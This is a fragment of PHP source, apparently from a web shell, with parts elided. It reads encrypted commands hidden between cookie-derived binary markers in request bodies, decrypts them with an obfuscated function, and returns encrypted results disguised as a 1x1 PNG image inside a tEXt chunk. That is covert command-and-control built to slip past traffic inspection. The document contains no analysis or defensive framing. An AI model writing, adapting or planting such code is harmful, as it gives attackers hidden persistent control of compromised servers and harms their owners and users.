...
function generate_binary_marker($cookie_value, $secret_key){
    $marker_string = $cookie_value . $secret_key;
    $md5_hash = md5($marker_string);

    return array(
        'left' => hex2bin(substr($md5_hash, 0, 16)),
        'right' => hex2bin(substr($md5_hash, 16))
    );
}
...
function run(){
    ...
    if (strpos($content_type, 'application/x-www-form-urlencoded') !== false) {
        ...
        $pms = S1MiwYYr(base64_decode($encrypted_data_base64), $secret_key);

    } else {

        $request_marker = generate_binary_marker($cookie_value . "mark", $secret_key);
        $left_marker = $request_marker['left'];
        $right_marker = $request_marker['right'];

        $raw_body = file_get_contents('php://input');

        $left_pos = strpos($raw_body, $left_marker);
        $right_pos = strrpos($raw_body, $right_marker);

        if ($left_pos === false || $right_pos === false || $left_pos >= $right_pos){
            return;
        }

        $encrypted_data = substr($raw_body, $left_pos + 8, $right_pos - $left_pos - 8);

        $pms = S1MiwYYr($encrypted_data, $secret_key);
    }
    ...
    $result=S1MiwYYr($result,$secret_key);

    $response_marker = generate_binary_marker($cookie_value, $secret_key);

    $encrypted_data = $response_marker['left'] . $result . $response_marker['right'];

    createPngResponse($encrypted_data);

    return $result;
}

function createPngResponse($encrypted_data){
    header('Content-Type: image/png');

    $png_header = "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A";

    $ihdr_data = pack('NNCCCCC', 1, 1, 8, 6, 0, 0, 0);
    $ihdr_chunk = pack('N', 13) . 'IHDR' . $ihdr_data . pack('N', crc32('IHDR' . $ihdr_data));

    $idat_data = gzcompress("\x00\x00\x00\x00\x00");
    $idat_chunk = pack('N', strlen($idat_data)) . 'IDAT' . $idat_data . pack('N', crc32('IDAT' . $idat_data));

    $custom_chunk_name = 'tEXt';
    $custom_chunk = pack('N', strlen($encrypted_data)) . $custom_chunk_name . $encrypted_data . pack('N', crc32($custom_chunk_name . $encrypted_data));
